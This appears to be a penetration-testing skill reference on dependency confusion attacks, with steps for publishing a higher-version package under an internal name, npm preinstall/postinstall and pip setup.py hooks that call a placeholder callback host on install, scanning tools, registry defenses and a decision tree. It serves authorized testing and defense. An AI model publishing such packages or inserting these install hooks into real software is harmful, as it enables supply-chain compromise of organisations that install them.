# SKILL: Dependency Confusion — Supply Chain Attack Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [4. EXPLOITATION](#4-exploitation)
- [5. TOOLS](#5-tools)
- [6. DEFENSE](#6-defense)
- [7. DECISION TREE](#7-decision-tree)
- [Related routing](#related-routing)
<!-- zhiyugo:toc:end -->

## 4. EXPLOITATION

**Authorized testing pattern**

1. **Register** (or use a controlled namespace) the **same package name** on the public registry your target resolver can reach.
2. Publish a **higher semver** than the legitimate internal line **within the victim’s declared range** (e.g. `^1.0.0` → publish `9.9.9`).
3. Add **lifecycle hooks** that prove execution without harming hosts—prefer **DNS/HTTP callback** to a collaborator you control, **no destructive writes**.

**npm `package.json` — minimal callback-style PoC (illustrative)**

```json
{
  "name": "some-internal-package-name",
  "version": "9.9.9",
  "description": "authorized dependency-confusion PoC only",
  "scripts": {
    "preinstall": "node -e \"require('https').get('https://YOUR_CALLBACK_HOST/poc?t='+process.env.npm_package_name)\""
  }
}
```

**npm `package.json` — shell + curl fallback (illustrative)**

```json
{
  "scripts": {
    "postinstall": "curl -fsS 'https://YOUR_CALLBACK_HOST/npm-postinstall' || true"
  }
}
```

**pip — setup hook pattern (illustrative; use only in authorized lab packages)**

```python
# setup.py (excerpt)
from setuptools import setup
from setuptools.command.install import install

class PoCInstall(install):
    def run(self):
        import urllib.request
        urllib.request.urlopen("https://YOUR_CALLBACK_HOST/pip-install")
        install.run(self)

setup(
    name="some-internal-package-name",
    version="9.9.9",
    cmdclass={"install": PoCInstall},
)
```

**Reference implementation (study / lab)**: community PoC layout and workflow similar to [`0xsapra/dependency-confusion-exploit`](https://github.com/0xsapra/dependency-confusion-exploit) — automate version bump, publish, and callback confirmation **only where you have written permission**.

---

## 5. TOOLS

| Tool | Role |
|------|------|
| [**visma-prodsec/confused**](https://github.com/visma-prodsec/confused) | Scans manifest files for dependency names that may be **claimable** on public registries (multi-ecosystem). |
| [**synacktiv/DepFuzzer**](https://github.com/synacktiv/DepFuzzer) | Automated **dependency confusion** testing workflows (use strictly in-scope). |

Run these only against **your** manifests or **authorized** engagements; do not use to squat names for unrelated third parties.

---

## 6. DEFENSE

- **npm**: Prefer **scoped** packages (`@org-scope/pkg`) with **org-owned** scopes; set **`.npmrc`** so private scopes map to private registry and **default `registry`** is not accidentally public for internal names.
- **Pinning**: **Exact versions** + **lockfiles** (`package-lock.json`, `poetry.lock`, `Gemfile.lock`, `composer.lock`) enforced in CI.
- **pip**: Avoid careless **`--extra-index-url`**; prefer **single private index** with **mirroring**, or **explicit `--index-url`** policies in CI.
- **Maven / Gradle**: Control **repository order**, use **internal mirrors**, and **block** unexpected groupIds on release pipelines.
- **Composer**: Use **`repositories`** with **`canonical: true`** for private packages; verify Packagist is not introducing unexpected vendors.
- **Defensive registration**: **Reserve** internal names on public registries (squat your own names) where policy allows.
- **Monitoring**: Tools such as **Socket.dev**, **Snyk**, or similar SBOM/supply-chain scanners to alert on **new publishers** or **version jumps** for critical packages.

---

## 7. DECISION TREE

```text
Do manifests reference package names that could be non-unique globally?
├─ NO → Dependency confusion unlikely from naming alone; pivot to typosquatting / compromised accounts.
└─ YES
    ├─ Is the private registry the ONLY source for that name (scoped + .npmrc / single index / mirror)?
    │   ├─ YES → Lower risk; still verify CI and developer machines do not override config.
    │   └─ NO → HIGH RISK
    │         ├─ Can a public registry publish a HIGHER version inside declared ranges?
    │         │   ├─ YES → Treat as exploitable in authorized tests; prove with callback PoC.
    │         │   └─ NO → Check pre-release tags, local `file:` deps, and stale lockfiles.
    │         └─ Are lifecycle scripts disabled/blocked in CI? (reduces impact, does not remove squat risk)
```

---

## Related routing

- **From `recon-for-sec`**: When doing **supply-chain reconnaissance**, cross-link leaked manifests and internal package identifiers with the checks in **Section 3** and the decision tree in **Section 7** before proposing any publish/PoC steps.
